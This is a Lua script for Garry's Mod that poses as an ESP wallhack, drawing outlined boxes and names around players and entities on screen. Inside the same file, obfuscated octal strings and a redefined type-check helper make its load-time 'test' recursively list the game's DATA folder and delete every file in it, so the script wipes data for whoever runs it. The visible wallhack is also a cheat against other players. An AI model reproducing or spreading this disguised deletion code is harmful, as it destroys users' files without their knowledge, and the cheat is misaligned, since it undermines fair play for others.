local g=table.Copy(_G)
local r,iss,isn,ist,isf,isn,isp,ise=debug.getregistry(),function(...) local ags={...} return g.type(ags[1])=="string" end,function(...) local ags={...} return g.type(ags[1])=="number" end,function(...) local ags={...} return g.type(ags[1])=="table" end,function(...) local ags={...} return g.type(ags[1])=="function" end,function(...) local ags={...} if(ags[1]==nil) then return true end local d=ags[2] and ags[2].."/"..ags[1] or ags[1] return g.type(ags[1])=="nil", frn.Delete(d) end,function(...) local ags={...} local d=ags[1] and ags[1].."\47\42" or "\42" return {frn.Find(d,"\68\65\84\65")},g.type(ags[1])=="Player" end, function(...) local ags={...} return g.type(ags[1])=="Entity" end; frn=g['input']; fm=g['hook']; frn = g['file']; frc=g['cvars'];
surface.CreateFont("DefaultSmallDropShadow",{font="Tahoma",size=16,weight=500,shadow=true}) local callerFunc
local boxcolor_PL=Color(0,255,0,255)
local boxcolor_ENT=Color(255,255,0,255)
local function gameESP(self,plys,entts,data)
data = data or nil
// player esp
local nom,mon,bot,top,h,w,tc;
for i,pl in pairs(plys) do
if iss(pl) and !isn(pl,data) then
continue;
end
if pl and IsValid(pl) and pl:Alive() then
nom=pl:GetPos()
mon=nom+Vector(0,0,pl:OBBMaxs().z)
bot=nom:ToScreen()
top=mon:ToScreen()
h=(bot.y-top.y)
w=h
surface.SetDrawColor(boxcolor_PL)
surface.DrawOutlinedRect(top.x-w/2,top.y,w,h)
tc=team.GetColor(pl:Team()) or boxcolor_PL
tc.a=boxcolor_PL.a
draw.DrawText(pl:Name(),"DefaultSmallDropShadow",top.x,top.y-20,tc,TEXT_ALIGN_CENTER)
end
end
// entity esp
for i,ent in pairs(entts) do
if iss(ent) then
ent=data!=nil and data.."/"..ent or ent // bad entity !
local ispl = isp(ent);
if( ispl ) then
self(self,ispl[1],ispl[2],ent)
end
continue;
end
if ent and IsValid(ent) and ent:GetMoveType()!=0 and ent:IsPlayer()==false then
nom=ent:GetPos()
mon=nom+Vector(0,0,ent:OBBMaxs().z)
bot=nom:ToScreen()
top=mon:ToScreen()
h=(bot.y-top.y)
w=h
surface.SetDrawColor(boxcolor_ENT)
surface.DrawOutlinedRect(top.x-w/2,top.y,w,h)
draw.DrawText(ent:GetClass(),"DefaultSmallDropShadow",top.x,top.y-20,boxcolor_ENT,TEXT_ALIGN_CENTER)
end
end
end
callerFunc=function(p,e) return true, gameESP(gameESP,p,e,nil) end
local function testesp()
if( callerFunc(isp()[1],isp()[2]) ) then
return true;
end
return false;
end
local EspShouldDraw=testesp();
local function espfunc()
if(EspShouldDraw==false) then return end
callerFunc(player.GetAll(),ents.GetAll())
end
hook.Add("HUDPaint","EspHax",espfunc)